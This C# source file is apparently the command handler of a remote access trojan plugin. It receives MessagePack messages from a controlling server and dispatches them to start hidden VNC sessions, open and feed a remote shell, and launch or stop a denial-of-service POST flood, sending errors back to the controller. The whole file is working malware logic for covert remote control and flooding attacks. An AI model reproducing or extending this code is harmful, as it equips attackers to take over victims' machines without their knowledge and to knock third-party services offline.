﻿using MessagePackLib.MessagePack;
using Miscellaneous.Handler;
using System;
using System.Threading;

namespace Plugin
{
    public static class Packet
    {
        public static CancellationTokenSource ctsDos;

        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "hVNCStart":
                        {
                            new Handle.handlenvch(unpack_msgpack.ForcePathObject("PORT").AsString, unpack_msgpack.ForcePathObject("MUTEX").AsString);
                            break;
                        }

                    case "shell":
                        {
                            HandleShell.StarShell();
                            break;
                        }

                    case "shellWriteInput":
                        {
                            if (HandleShell.ProcessShell != null)
                                HandleShell.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                            break;
                        }

                    case "dosAdd":
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Pac_ket").AsString = "dosAdd";
                            Connection.Send(msgpack.Encode2Bytes());
                            break;
                        }


                    case "dos":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "postStart":
                                    {
                                        ctsDos = new CancellationTokenSource();
                                        new HandleDos().DosPost(unpack_msgpack);
                                        break;
                                    }

                                case "postStop":
                                    {
                                        ctsDos.Cancel();
                                        Thread.Sleep(2500);
                                        Connection.Disconnected();
                                        break;
                                    }
                            }
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}